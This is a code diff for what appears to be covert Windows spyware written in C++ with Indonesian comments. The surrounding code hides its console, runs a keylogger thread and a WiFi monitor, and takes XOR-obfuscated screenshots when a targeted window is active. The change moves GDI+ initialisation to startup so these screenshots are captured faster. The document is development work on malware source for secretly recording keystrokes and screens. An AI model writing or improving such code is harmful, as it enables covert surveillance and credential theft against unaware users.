@@ -214,6 +214,12 @@ void ServiceLogic() {
     SetProcessDPIAware(); 
     FreeConsole(); 
 
+    // --- INISIALISASI GDI+ GLOBAL ---
+    // Dipindahkan ke sini agar TakeScreenshot berjalan instan tanpa overhead startup/shutdown berulang
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
     std::thread(KeylogLoop).detach();
     std::thread(WifiFilter::StartMonitoring).detach();
 
@@ -266,6 +272,7 @@ void ServiceLogic() {
             if (detected) {
                 if (!isKeyloggerRunning || (currentWin != lastWindow && !currentWin.empty())) {
                     isKeyloggerRunning = true;
+                    // Fungsi TakeScreenshot sekarang sangat cepat karena GDI+ sudah aktif secara global
                     vector<BYTE> ss = SystemMonitor::TakeScreenshot();
                     if (!ss.empty()) {
                         XORData(ss);
@@ -311,6 +318,9 @@ void ServiceLogic() {
             this_thread::sleep_for(chrono::seconds(30)); 
         }
     }
+
+    // Shutdown GDI+ saat keluar (opsional karena ini service loop infinite)
+    Gdiplus::GdiplusShutdown(gdiplusToken);
 }
 
 bool FetchLatestLink() {
